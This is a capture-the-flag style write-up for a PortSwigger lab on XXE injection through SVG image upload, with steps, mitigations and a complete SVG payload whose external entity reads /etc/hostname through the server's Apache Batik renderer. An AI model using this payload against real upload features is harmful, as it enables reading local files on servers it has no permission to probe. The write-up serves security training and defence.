#  Lab: Exploiting XXE via Image File Upload

**Lab URL:** [PortSwigger Web Security Academy](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)  
**Category:** XML External Entity (XXE)  
**Difficulty:**  Practitioner  
**Lab Goal:** Upload an image that uses XXE to extract the contents of `/etc/hostname` and display it.

##  Steps to Reproduce

1. Create a local SVG image with the  XXE payload.
2. Go to any blog post and submit a comment.
3. Upload the SVG as your avatar image.
4. When the image renders, it will display the contents of `/etc/hostname`.
5. Submit the hostname to solve the lab.


##  Payload

Save this as `exploit.svg`:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```


## Expected Result

- When the image is processed by the Apache Batik library, it will resolve the external entity.
- The SVG will render the hostname from `/etc/hostname` inside the image.
- Copy that value and submit it to solve the lab.


##  Key Takeaway

This lab shows how XXE can be exploited even in **file upload** functionalities when server-side image processors like **Apache Batik** parse XML content, enabling attackers to steal local file data.

##  Mitigation

- Sanitize uploaded files and restrict content types.
- Disable DTDs in XML parsers used by backend services like image libraries.
- Avoid using XML-based image formats for user uploads if not necessary.


##  Author

`vgod-sec` 
🔗 GitHub: [https://github.com/vgod-sec](https://github.com/vgod-sec)
